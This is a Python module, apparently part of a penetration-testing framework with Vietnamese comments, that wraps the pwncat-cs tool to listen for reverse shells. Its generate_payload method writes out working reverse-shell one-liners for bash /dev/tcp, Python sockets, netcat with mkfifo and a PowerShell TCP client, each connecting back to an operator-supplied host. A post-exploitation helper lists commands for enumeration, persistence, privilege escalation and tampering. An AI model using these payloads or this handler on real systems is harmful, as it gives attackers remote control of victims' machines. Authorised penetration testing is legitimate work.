"""Tích hợp pwncat-cs - xử lý reverse shell tự động."""
import subprocess
import shutil
import threading
from core.logger import get_logger
from core.events import BUS

LOG = get_logger("ceh.shell")


class ShellHandler:
    """Wrapper quanh pwncat-cs để bắt reverse shell."""

    def __init__(self):
        self.available = shutil.which("pwncat-cs") is not None
        if not self.available:
            LOG.warning("[shell] pwncat-cs chưa cài. "
                        "Cài: pip install pwncat-cs")

    def start_listener(self, lhost="0.0.0.0", lport=4444,
                       platform="linux", background=False):
        """Khởi động listener chờ reverse shell."""
        if not self.available:
            return {"error": "pwncat-cs chưa cài"}

        LOG.info(f"[shell] pwncat-cs listen {lhost}:{lport} ({platform})")
        cmd = ["pwncat-cs", f"{lhost}:{lport}"]
        if platform == "windows":
            cmd.append("--platform=windows")

        BUS.emit("shell_listener_start", {
            "lhost": lhost, "lport": lport, "platform": platform,
        }, module="shell_handler")

        if background:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True)
            threading.Thread(target=self._stream, args=(proc,),
                             daemon=True).start()
            return {"pid": proc.pid, "lhost": lhost, "lport": lport}

        try:
            subprocess.run(cmd, timeout=3600)
        except subprocess.TimeoutExpired:
            LOG.warning("[shell] Listener timeout")
        return {"status": "closed"}

    def _stream(self, proc):
        for line in proc.stdout:
            BUS.emit("shell_output", {"line": line.rstrip()},
                     module="shell_handler")

    def generate_payload(self, lhost, lport, os_type="linux",
                         method="bash"):
        """Sinh payload reverse shell."""
        payloads = {
            ("linux", "bash"): f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            ("linux", "python"):
                f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
                f"s.connect((\"{lhost}\",{lport}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            ("linux", "nc"):
                f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
                f"nc {lhost} {lport} >/tmp/f",
            ("windows", "powershell"):
                f"$client = New-Object System.Net.Sockets.TCPClient("
                f"'{lhost}',{lport});$stream = $client.GetStream();"
                f"[byte[]]$bytes = 0..65535|%{{0}};"
                f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
                f"{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding)"
                f".GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );"
                f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                f"$stream.Write($sendbyte,0,$sendbyte.Length);"
                f"$stream.Flush()}};$client.Close()",
        }
        return payloads.get((os_type, method),
                            payloads.get(("linux", "bash"), ""))

    def post_exploit(self, command="info"):
        """Chạy lệnh hậu khai thác trong session đang mở (thủ công)."""
        # pwncat-cs chạy interactive; dùng tmux/screen để tự động hóa
        return {"note": "pwncat-cs chạy interactive. "
                        "Dùng `pwncat-cs --help` để xem các lệnh.",
                "commands": {
                    "enumerate": "pwncat> run enumerate",
                    "persist": "pwncat> run persist",
                    "escalate": "pwncat> run escalate",
                    "tamper": "pwncat> run tamper",
                }}